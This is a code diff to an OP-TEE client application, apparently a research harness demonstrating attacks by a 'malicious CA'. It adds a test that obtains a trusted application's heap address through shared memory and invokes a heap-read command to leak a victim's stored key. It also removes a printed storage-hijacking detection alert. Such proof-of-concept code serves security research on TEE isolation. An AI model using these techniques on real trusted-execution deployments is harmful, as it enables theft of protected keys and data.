@@ -29,6 +29,8 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
 
 /* OP-TEE TEE client API (built by optee_client) */
 #include <tee_client_api.h>
@@ -49,6 +51,10 @@
 #define TA_SECURE_STORAGE_CMD_READ_RAW						4
 #define TA_SECURE_STORAGE_CMD_WRITE_RAW						5
 #define TA_SECURE_STORAGE_CMD_DELETE						6
+#define TA_HEAP_PARAM_PAC_CMD_ALLOC_HEAP					7
+#define TA_HEAP_PARAM_PAC_CMD_READ_HEAP						8
+#define TA_HEAP_PARAM_PAC_CMD_WRITE_HEAP					9
+#define TA_HEAP_PARAM_PAC_CMD_RELEASE_HEAP					10
 
 #define BUFFER_SIZE    20
 
@@ -80,7 +86,7 @@ TEEC_Result read_secure_object(TEEC_Session *sess, char *id,
 	case TEEC_ERROR_ITEM_NOT_FOUND:
 		break;
 	default:
-		printf("               \033[1;37;41mDetect storage hijacking\033[0m\n");
+		break;
 	}
 
 	return res;
@@ -162,14 +168,51 @@ int main(int argc, char const *argv[])
 	printf("    [-] The malicious CA tries to leak victim CA's key: '0x%lX'\n", key);
 	res = TEEC_InvokeCommand(&sess, TA_HPE_VICTIM_CMD_LOAD_SECRET, &op,
 				 &err_origin);
+	TEEC_CloseSession(&sess);
 
-	/* Test heap address */
-	// printf("\033[1;37;44m[*] Test heap address\033[0m\n");
+	/* Test compromise on TA's heap */
+	printf("\033[1;37;44m[*] Test compromise on TA's heap\033[0m\n");
+	printf("    [-] The victim CA has stored key '0x%lX' in TA's heap\n", key);
+
+	res = TEEC_OpenSession(&ctx, &sess, &uuid,
+			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
+	if (res != TEEC_SUCCESS)
+		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
+			res, err_origin);
+
+	int shmid;
+    key_t key_id = ftok("shared_memory_key", 123);
+    size_t size = sizeof(uint32_t) * 2;
+
+    shmid = shmget(key_id, size, 0666);
+
+    int* sharedData = (int*)shmat(shmid, NULL, 0);
+
+	memset(&op, 0, sizeof(op));
+	op.paramTypes = TEEC_PARAM_TYPES(TEEC_INVARIANT_VALUE_INPUT, TEEC_VALUE_OUTPUT,
+					 TEEC_NONE, TEEC_NONE);
+    op.params[0].value.a = sharedData[0];
+    op.params[0].value.b = sharedData[1];
+
+	printf("    [-] The malicious CA got TA's heap address: 0x%X%X\n", 
+			op.params[0].value.b, op.params[0].value.a);
+
+    shmdt(sharedData);
+	
+	printf("    [-] The malicious CA tries to leak victim CA's key: '0x%lX'\n", key);
+	res = TEEC_InvokeCommand(&sess, TA_HEAP_PARAM_PAC_CMD_READ_HEAP, &op,
+				 &err_origin);
+	TEEC_CloseSession(&sess);
 
 	/* Test TEE_ObjectHandle */
 	// printf("\033[1;37;44m[*] Test TEE_ObjectHandle\033[0m\n");
 
 	/* Test storage hijacking */
+	res = TEEC_OpenSession(&ctx, &sess, &uuid,
+			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
+	if (res != TEEC_SUCCESS)
+		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
+			res, err_origin);
 	printf("\033[1;37;44m[*] Test storage hijacking\033[0m\n");
 	printf("    [-] The victim CA deposits sensitive data to the storage with ID 'object#1'\n");
 	printf("    [-] The malicious CA tries to leak victim CA's data with ID 'object#1'\n");
@@ -177,11 +220,11 @@ int main(int argc, char const *argv[])
 	char read_data[TEST_OBJECT_SIZE];
 	res = read_secure_object(&sess, obj1_id,
 				 read_data, sizeof(read_data));
+	TEEC_CloseSession(&sess);
 
 	/* Test opaque handles */
 	// printf("\033[1;37;44m[*] Test opaque handles\033[0m\n");
 
-	TEEC_CloseSession(&sess);
 	TEEC_FinalizeContext(&ctx);
 
 	return 0;
